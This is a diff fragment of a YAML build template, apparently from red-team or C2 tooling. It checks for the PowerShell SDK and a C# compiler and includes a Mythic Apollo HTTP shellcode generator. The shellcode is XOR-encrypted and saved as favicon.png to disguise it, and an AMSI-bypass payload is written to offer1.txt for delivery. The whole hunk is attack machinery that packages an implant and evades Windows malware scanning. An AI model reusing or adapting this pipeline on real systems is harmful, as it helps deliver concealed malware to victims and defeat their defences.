@@ -11,7 +11,7 @@ content: |
   find /opt -name "System.Management.Automation.dll" 2>/dev/null | grep -q . || printf '%s\n' 'ERROR: System.Management.Automation.dll not found or accessible in /opt (PowerShell SDK required)' ; \
   command -v mcs > /dev/null 2>&1 && \
   find /opt -name "System.Management.Automation.dll" 2>/dev/null | grep -q . && \
-  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }}
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} \
   python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png && \
   rm packstation/outbound/shellcode.bin && \
   sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt && \
